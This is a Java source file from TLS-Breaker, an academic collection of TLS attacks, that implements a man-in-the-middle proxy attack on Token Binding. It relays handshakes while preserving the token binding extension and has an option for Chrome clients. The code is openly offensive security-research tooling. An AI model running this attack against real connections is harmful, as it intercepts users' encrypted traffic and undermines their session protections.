/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.attacks.impl;

import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.ExtensionType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.RemBufferedChExtensionsAction;
import de.rub.nds.tlsattacker.core.workflow.action.executor.WorkflowExecutorType;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsbreaker.attacks.config.TokenBindingMitmCommandConfig;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 *
 */
public class TokenBindingMitm extends Attacker<TokenBindingMitmCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     *
     * @param config
     * @param baseConfig
     */
    public TokenBindingMitm(TokenBindingMitmCommandConfig config, Config baseConfig) {
        super(config, baseConfig);

    }

    @Override
    public void executeAttack() {

        Config conf = config.createConfig();
        WorkflowConfigurationFactory f = new WorkflowConfigurationFactory(conf);
        WorkflowTrace trace = f.createWorkflowTrace(WorkflowTraceType.RSA_SYNC_PROXY, RunningModeType.MITM);

        RemBufferedChExtensionsAction remExtAction = (RemBufferedChExtensionsAction) trace.getTlsActions().get(3);
        // Don't remove the token binding extension
        remExtAction.getRemoveExtensions().remove(ExtensionType.TOKEN_BINDING);

        State state = new State(conf, trace);

        WorkflowExecutorType execType = WorkflowExecutorType.DEFAULT;
        if (config.isChrome()) {
            execType = WorkflowExecutorType.THREADED_SERVER;
            LOGGER.info("Chrome flag set, executing workflow with " + execType + " executor");
        }
        WorkflowExecutor exec = WorkflowExecutorFactory.createWorkflowExecutor(execType, state);
        exec.executeWorkflow();
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not supported yet.");
    }
}
